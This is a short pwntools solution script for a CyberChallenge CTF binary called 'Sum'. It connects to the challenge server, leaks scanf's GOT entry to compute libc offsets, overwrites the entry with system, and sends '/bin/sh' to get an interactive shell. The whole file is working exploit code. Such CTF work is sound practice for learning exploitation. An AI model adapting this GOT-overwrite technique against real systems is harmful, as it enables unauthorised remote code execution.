from pwn import *

exe = ELF("/home/alessio/Scrivania/tools/CTFs/CyberChallenge/Week 10/Sum/sum")
context.binary = exe
r = remote("sum.challs.cyberchallenge.it", 6014)

abs_scanf = 0x0017c4e0
abs_system = 0x0014f440
scanf_got = 787465

r.sendline(b"-1")
r.recvuntil(">")
r.clean()
r.sendline(b"get " + str(scanf_got).encode())

rel_scanf = int(r.recvline()[:-1])
print("Relative scanf:  " + hex(rel_scanf))

offset = rel_scanf - abs_scanf
print("Offset:  " + hex(offset))

rel_system = offset + abs_system
print("Relative system:  " + hex(rel_system))

r.sendline(b"set " + str(scanf_got).encode() + b" " + str(rel_system).encode())

r.sendline(b"/bin/sh")
r.interactive()
